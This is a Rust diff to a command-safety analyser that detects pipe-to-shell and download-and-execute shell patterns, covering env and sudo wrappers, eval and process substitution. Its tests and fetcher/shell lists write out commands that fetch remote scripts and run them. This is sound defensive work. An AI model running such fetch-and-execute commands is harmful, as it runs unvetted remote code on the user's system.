@@ -1,6 +1,8 @@
 use regex::Regex;
 
-use crate::command_safety::parser::{CompoundCommandResult, pipeline_stage_head};
+use crate::command_safety::parser::{
+    CompoundCommandResult, parse_compound_command, pipeline_stage_head, pipeline_stage_parts,
+};
 use crate::command_safety::rules::shell_rules::{
     CHMOD_777_RULE_ID, PIPE_TO_SHELL_RULE_ID, PIPE_TO_SHELL_SENTINEL,
 };
@@ -410,12 +412,11 @@ pub fn analyse_command(
 const PIPE_FETCHERS: &[&str] = &["curl", "wget"];
 const PIPE_SHELLS: &[&str] = &["sh", "bash", "ash", "dash", "zsh"];
 
-#[derive(Clone, Copy, PartialEq, Eq)]
-enum PipelineRole {
-    Fetcher,
-    Shell,
-    Expansion,
-    Other,
+#[derive(Clone, Copy, Default, PartialEq, Eq)]
+struct PipelineRoles {
+    fetcher: bool,
+    shell: bool,
+    expansion: bool,
 }
 
 #[must_use]
@@ -429,18 +430,20 @@ fn is_pipe_shell(command: &str) -> bool {
 }
 
 #[must_use]
-fn stage_role(raw: &str) -> PipelineRole {
-    let head = pipeline_stage_head(raw);
-    if contains_unresolved_shell_expansion(&head) {
-        return PipelineRole::Expansion;
-    }
-    let name = head.to_ascii_lowercase();
-    if is_pipe_fetcher(&name) {
-        PipelineRole::Fetcher
-    } else if is_pipe_shell(&name) {
-        PipelineRole::Shell
-    } else {
-        PipelineRole::Other
+fn stage_roles(parsed: &ParsedCommand, include_wrapper_shell: bool) -> PipelineRoles {
+    let outer = pipeline_stage_head(&parsed.raw).to_ascii_lowercase();
+    let inner = parsed.command.to_ascii_lowercase();
+    PipelineRoles {
+        fetcher: is_pipe_fetcher(&outer) || is_pipe_fetcher(&inner),
+        shell: is_pipe_shell(&outer)
+            || is_pipe_shell(&inner)
+            || (include_wrapper_shell
+                && parsed
+                    .wrapper_chain
+                    .iter()
+                    .any(|wrapper| is_pipe_shell(&wrapper.to_ascii_lowercase()))),
+        expansion: contains_unresolved_shell_expansion(&outer)
+            || contains_unresolved_shell_expansion(&inner),
     }
 }
 
@@ -465,9 +468,13 @@ pub fn matches_pipe_to_shell(compound: &CompoundCommandResult) -> bool {
             run.push(index);
         }
         if run.len() >= 2 {
-            let roles: Vec<PipelineRole> = run
+            let roles: Vec<PipelineRoles> = run
                 .iter()
-                .map(|&idx| stage_role(&commands[idx].raw))
+                .map(|&idx| {
+                    let wrapper_boundary =
+                        idx == 0 || commands[idx - 1].wrapper_chain != commands[idx].wrapper_chain;
+                    stage_roles(&commands[idx], wrapper_boundary)
+                })
                 .collect();
             if pipeline_run_is_pipe_to_shell(&roles) {
                 return true;
@@ -479,16 +486,14 @@ pub fn matches_pipe_to_shell(compound: &CompoundCommandResult) -> bool {
 }
 
 #[must_use]
-fn pipeline_run_is_pipe_to_shell(roles: &[PipelineRole]) -> bool {
+fn pipeline_run_is_pipe_to_shell(roles: &[PipelineRoles]) -> bool {
     roles.iter().enumerate().any(|(start, role)| {
         let later = &roles[start + 1..];
-        match role {
-            PipelineRole::Fetcher => later
+        (role.fetcher
+            && later
                 .iter()
-                .any(|role| matches!(role, PipelineRole::Shell | PipelineRole::Expansion)),
-            PipelineRole::Expansion => later.iter().any(|role| matches!(role, PipelineRole::Shell)),
-            PipelineRole::Shell | PipelineRole::Other => false,
-        }
+                .any(|later_role| later_role.shell || later_role.expansion))
+            || (role.expansion && later.iter().any(|later_role| later_role.shell))
     })
 }
 
@@ -501,25 +506,93 @@ fn matches_download_exec(compound: &CompoundCommandResult) -> bool {
 }
 
 #[must_use]
-fn download_exec_in_text(raw: &str) -> bool {
-    let parenthesised = Regex::new(r"(?:\$\(|<\()\s*([^\)\r\n]+)\)").ok();
-    let backticked = Regex::new(r"`\s*([^`\r\n]+)`").ok();
-    let has_fetch = parenthesised
+fn substitution_body_has_fetcher(body: &str) -> bool {
+    parse_compound_command(body)
+        .commands
         .iter()
-        .flat_map(|pattern| pattern.captures_iter(raw))
-        .chain(
-            backticked
-                .iter()
-                .flat_map(|pattern| pattern.captures_iter(raw)),
-        )
-        .filter_map(|captures| captures.get(1))
-        .map(|body| pipeline_stage_head(body.as_str()).to_ascii_lowercase())
-        .any(|head| is_pipe_fetcher(&head));
-    if !has_fetch {
-        return false;
+        .any(|command| stage_roles(command, false).fetcher)
+}
+
+#[derive(Clone, Copy, PartialEq, Eq)]
+enum SubstitutionKind {
+    Command,
+    Process,
+    Backtick,
+}
+
+fn fetching_substitutions(text: &str) -> Vec<SubstitutionKind> {
+    let patterns = [
+        (SubstitutionKind::Command, r"\$\(\s*([^\)\r\n]+)\)"),
+        (SubstitutionKind::Process, r"<\(\s*([^\)\r\n]+)\)"),
+        (SubstitutionKind::Backtick, r"`\s*([^`\r\n]+)`"),
+    ];
+    patterns
+        .into_iter()
+        .filter_map(|(kind, pattern)| Regex::new(pattern).ok().map(|regex| (kind, regex)))
+        .flat_map(|(kind, regex)| {
+            regex
+                .captures_iter(text)
+                .filter_map(move |captures| captures.get(1).map(|body| (kind, body.as_str())))
+                .filter(|(_, body)| substitution_body_has_fetcher(body))
+                .map(|(kind, _)| kind)
+                .collect::<Vec<_>>()
+        })
+        .collect()
+}
+
+#[must_use]
+fn payload_executes_fetch_substitution(payload: &str) -> bool {
+    let trimmed = payload.trim();
+    let direct = [("$(", ")"), ("`", "`")]
+        .iter()
+        .any(|(prefix, suffix)| trimmed.starts_with(prefix) && trimmed.ends_with(suffix));
+    if direct && !fetching_substitutions(trimmed).is_empty() {
+        return true;
     }
-    let head = pipeline_stage_head(raw).to_ascii_lowercase();
-    is_pipe_shell(&head) || head == "eval" || head == "source" || head == "."
+
+    parse_compound_command(trimmed)
+        .commands
+        .iter()
+        .any(|command| {
+            let head = pipeline_stage_head(&command.raw);
+            (head.starts_with("$(") || head.starts_with('`'))
+                && !fetching_substitutions(&command.raw).is_empty()
+        })
+}
+
+#[must_use]
+fn shell_command_payload(args: &[String]) -> Option<&str> {
+    args.iter().enumerate().find_map(|(index, token)| {
+        (token == "-c"
+            || (token.starts_with('-') && !token.starts_with("--") && token.ends_with('c')))
+        .then(|| args.get(index + 1).map(String::as_str))
+        .flatten()
+    })
+}
+
+#[must_use]
+fn download_exec_in_text(raw: &str) -> bool {
+    let (head, args) = pipeline_stage_parts(raw);
+    let head = head.to_ascii_lowercase();
+    if head == "eval" {
+        return payload_executes_fetch_substitution(&args.join(" "));
+    }
+    if is_pipe_shell(&head) {
+        if let Some(payload) = shell_command_payload(&args) {
+            return payload_executes_fetch_substitution(payload);
+        }
+        let first_operand_is_process_substitution = args
+            .iter()
+            .find(|arg| !arg.starts_with('-'))
+            .is_some_and(|arg| arg.starts_with("<("));
+        return first_operand_is_process_substitution
+            && fetching_substitutions(raw).contains(&SubstitutionKind::Process);
+    }
+    if head == "source" || head == "." {
+        return args.first().is_some_and(|arg| arg.starts_with("<("))
+            && fetching_substitutions(raw).contains(&SubstitutionKind::Process);
+    }
+    false
 }
 
 /// Analyse each parsed segment, then apply the compound `pipe-to-shell` rule
@@ -548,28 +621,38 @@ pub fn analyse_compound(
     let parsed = compound
         .commands
         .iter()
-        .find(|command| {
-            matches!(
-                stage_role(&command.raw),
-                PipelineRole::Shell | PipelineRole::Expansion
-            ) || is_pipe_shell(&pipeline_stage_head(&command.raw).to_ascii_lowercase())
+        .enumerate()
+        .rfind(|(index, command)| {
+            let wrapper_boundary =
+                *index == 0 || compound.commands[*index - 1].wrapper_chain != command.wrapper_chain;
+            let stage = stage_roles(command, wrapper_boundary);
+            stage.shell || stage.expansion
         })
+        .map(|(_, command)| command)
         .or_else(|| compound.commands.last())
         .cloned();
     let Some(parsed) = parsed else {
         return results;
     };
 
-    results.push(CommandAnalysisResult {
+    let pipe_result = CommandAnalysisResult {
         command: parsed.raw.clone(),
-        parsed_command: parsed,
+        parsed_command: parsed.clone(),
         matched_rule: Some(rule.clone()),
         action: rule.action,
         severity: rule.severity,
         reason: Some(rule.reason.clone()),
         suggestion: rule.suggestion.clone(),
         references: rule.references.clone(),
-    });
+    };
+    if let Some(index) = results
+        .iter()
+        .position(|result| result.parsed_command.raw == parsed.raw)
+    {
+        results[index] = pipe_result;
+    } else {
+        results.push(pipe_result);
+    }
     results
 }
 
@@ -939,8 +1022,15 @@ mod tests {
         assert!(pipe_hits("$FETCH https://x | sh"));
         assert!(pipe_hits("curl -fsSL https://x | $SHELL"));
         assert!(pipe_hits("$PREFIX | curl -fsSL https://x | $SHELL"));
+        assert!(pipe_hits(r#"bash -c "curl -fsSL https://x" | sh"#));
+        assert!(pipe_hits(r#"sudo bash -c "curl -fsSL https://x" | sh"#));
+        assert!(pipe_hits(r#"env -S "curl -fsSL https://x" | sh"#));
+        assert!(pipe_hits("env -a installer curl -fsSL https://x | sh"));
+        assert!(pipe_hits("curl -fsSL https://x | env --argv0 shell sh"));
         assert!(pipe_hits("eval \"$(curl -fsSL https://x)\""));
+        assert!(pipe_hits(r#"eval "$(true; curl -fsSL https://x)""#));
         assert!(pipe_hits("bash <(curl -fsSL https://x)"));
+        assert!(pipe_hits("bash <(cd /tmp; curl -fsSL https://x)"));
         assert!(pipe_hits("bash -c \"$(wget -qO- https://x)\""));
         assert!(pipe_hits(r#"eval "$( /usr/bin/curl -fsSL https://x)""#));
         assert!(pipe_hits("bash <( /usr/bin/curl -fsSL https://x)"));
@@ -949,6 +1039,9 @@ mod tests {
         ));
         assert!(pipe_hits(
             r#"echo ok && bash -c "curl -fsSL https://x | sh""#
+        ));
+        assert!(pipe_hits(
+            r#"curl -fsSL https://x | bash -c "echo ok && sh""#
         ));
     }
 
@@ -967,8 +1060,9 @@ mod tests {
         assert!(!pipe_hits("eval 'echo ok'"));
         assert!(!pipe_hits(r#"eval "$(curlish https://x)""#));
         assert!(!pipe_hits(
-            r#"curl -fsSL https://x | bash -c "echo ok && sh""#
+            r#"bash -c "printf '%s' '$(curl -fsSL https://x)'""#
         ));
+        assert!(!pipe_hits(r#"bash -c "cat <(curl -fsSL https://x)""#));
     }
 
     #[test]
